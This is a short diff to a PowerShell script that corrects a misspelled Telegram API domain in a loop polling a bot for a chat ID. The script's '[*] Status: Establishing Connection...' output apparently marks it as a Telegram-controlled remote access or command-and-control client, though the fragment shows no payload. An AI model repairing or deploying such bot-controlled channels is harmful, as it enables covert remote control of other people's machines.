@@ -18,7 +18,7 @@ Write-Host '[*] Status: Establishing Connection...' -ForegroundColor Yellow
 $chatId = $null
 while (-not $chatId) {
     try {
-        $updates = Invoke-RestMethod -Uri "https://api.telegram.0rg/bot$Token/getUpdates" -ErrorAction Stop
+        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates" -ErrorAction Stop
         if ($updates.ok -and $updates.result.Count -gt 0) {
             $chatId = $updates.result[-1].message.chat.id
         }
